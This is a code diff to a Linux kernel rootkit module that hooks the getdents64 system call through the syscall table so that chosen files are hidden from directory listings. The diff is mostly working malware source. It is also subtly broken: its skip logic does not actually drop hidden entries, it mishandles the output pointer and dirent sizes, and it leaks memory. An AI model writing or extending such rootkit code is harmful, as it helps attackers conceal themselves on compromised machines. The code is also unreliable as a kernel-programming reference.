@@ -7,6 +7,7 @@
 #include <linux/init.h>
 #include <linux/slab.h>
 #include <linux/list.h>
+#include <linux/dirent.h>
 
 // TODO 
 // Hide files and processes
@@ -86,7 +87,6 @@ typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dir
                                        unsigned int count);
 getdents_ptr orig_getdents;
 
-
 asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
                                unsigned int count)
 {
@@ -134,6 +134,57 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	return actual_result;
 }
 
+typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp,
+                                         unsigned int count);
+getdents64_ptr orig_getdents64;
+
+asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+                                 unsigned int count)
+{
+	int actual_result, i;
+	struct hidden_file *ptr;
+	struct linux_dirent64 toWorkWith;
+	struct linux_dirent64 *forUser;
+
+	printk(KERN_INFO "Running hacked_getdents64\n");
+
+	// check user space access and allocate kernel space linux_dirent
+	if (!access_ok(VERIFY_READ,dirp,count))
+		return -1;
+	if ((forUser = kmalloc(count,GFP_KERNEL)) == NULL)
+		return -1;
+
+	// run real getdents64 and check result for files to hide
+	actual_result = (*orig_getdents64)(fd,dirp,count);
+	if (actual_result > 0) { // actually read some bytes
+		printk(KERN_INFO "Checking dirp\n");
+		for (i = 0; i < actual_result / sizeof(struct linux_dirent64); i++) {
+			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent64)))
+				return -1;
+			list_for_each_entry(ptr,&hidden_files,list) {
+				if (toWorkWith.d_ino == ptr->inode) {
+					printk(KERN_INFO "Found file to hide\n");
+					continue;
+				}
+			}
+			*forUser++ = toWorkWith;
+		}
+	}
+	else {
+		return actual_result;
+	}
+
+	// copy linux_dirent * to user space
+	if (!access_ok(VERIFY_WRITE,dirp,count))
+		return -1;
+	if (copy_to_user(dirp,forUser,count))
+		return -1;
+	kfree(forUser);
+
+	// return actual result
+	return actual_result;
+}
+
 int rootkit_init(void) {
 	GPF_DISABLE;
 
@@ -142,6 +193,9 @@ int rootkit_init(void) {
 
 	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
 	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
+
+	orig_getdents64 = (getdents64_ptr)sys_call_table[__NR_getdents64];
+	sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
 
 	GPF_ENABLE;
 	printk(KERN_INFO "Loading rootkit\n");
@@ -157,6 +211,7 @@ void rootkit_exit(void) {
 	GPF_DISABLE;
 	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
+	sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
 	GPF_ENABLE;
 
 	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
